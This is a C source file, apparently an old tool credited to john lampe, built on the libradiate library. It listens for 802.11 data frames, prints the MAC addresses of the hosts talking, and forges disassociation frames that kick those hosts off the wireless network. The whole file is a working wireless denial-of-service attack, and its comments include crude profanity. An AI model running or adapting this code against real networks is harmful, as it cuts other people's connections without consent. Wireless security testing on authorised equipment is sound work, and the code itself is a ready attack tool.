/* by john lampe
program looks for data frames on an 802.11 network and disassociates communicating hosts

compile with gcc -omamasay mamasay.c -lradiate 

example, 
./mamasay
*/

#include <errno.h>
#include <time.h>
#include <radiate.h>



int main (int argc, char **argv) {
    radiate_t *context;
    char errbuff[1024];
    u_char *frame;
    u_char *buf;
    u_char *temp;
    int psi,mu,q,myread,x,unused,c;
    u_char *bssid;
    u_char *dstmac;
    u_char *dstmac2;
    u_char *srcmac;
    u_char data = RADIATE_REASON_PREV_AUTH_NOT_VALID;
//    struct hfa384x_tx_frame tx;
//    struct hfa384x_rx_frame *rx;

    context = radiate_init (0 , errbuff);
    if (context==NULL) {
        fprintf(stderr, "you fuck-dip...you screwed up radiate_init\n");
    }

    for (mu=0; mu < 1000; mu += 1) {
        myread = radiate_read(&buf, context);                                  //f00 uncomment this good chit
        if (myread == -1) {
            fprintf(stderr, "Failed to read SHIT\n");
        } 


        /* HFA384X RX frame descriptor from the Prism2 header file
        u16 status;  HFA384X_RX_STATUS_ flags                   0-1 
        u32 time;  timestamp, 1 microsecond resolution          2-5
        u8 silence;  27 .. 154; seems to be 0                   6
        u8 signal;  27 .. 154                                   7 
        u8 rate;  10, 20, 55, or 110                            8
        u8 rxflow;                                              9
        u32 reserved;                                           10-13

          
        u16 frame_control;                                     14-15
        u16 duration_id;                                       16-17
        u8 addr1[6];               19th byte i.e. buf[18]      18-23
        u8 addr2[6];               25th byte i.e. buf[24]      etc
        u8 addr3[6];               31st byte i.e. buf[30]
        u16 seq_ctrl;              
        u8 addr4[6];
        u16 data_len;

        /* 802.3 */
        u8 dst_addr[6];
        u8 src_addr[6];
        u16 len;
        */

    // order is destmac  bssid srcmac starting at 19th byte of buf[]
        if (buf[14] == 0x08) {
            fprintf(stderr, "%d bytes read\n", myread);                                    //remove
            fprintf(stderr, "DEST = ");
            for (psi=18; psi < 24 ; psi += 1) {fprintf(stderr, "%x:", buf[psi]);}         //remove
            fprintf(stderr, "\n");
            fprintf(stderr, "SOURCE = ");
            for (psi=24; psi < 30; psi += 1) {fprintf(stderr, "%x:", buf[psi]);}
            fprintf(stderr, "\n");
            fprintf(stderr, "BSSID = ");
            for (psi=30; psi < 36; psi += 1) {fprintf(stderr, "%x:", buf[psi]);}
            fprintf(stderr, "\n\n");                                                           //end remove

            
            frame = radiate_build_mgmt_frame(&(buf[18]),&(buf[30]),&(buf[24]),RADIATE_MGMT_STYPE_DISASSOC,0,(u_char *)&data,sizeof(data),context);
            c = radiate_write(frame, sizeof(struct hfa384x_tx_frame), context);
            if (c == -1) { 
                fprintf (stderr, "dip shit...radiate_write error\n");
            } 
        } // end if-buf[14] 
      }  // end for-mu

    return 1;
}




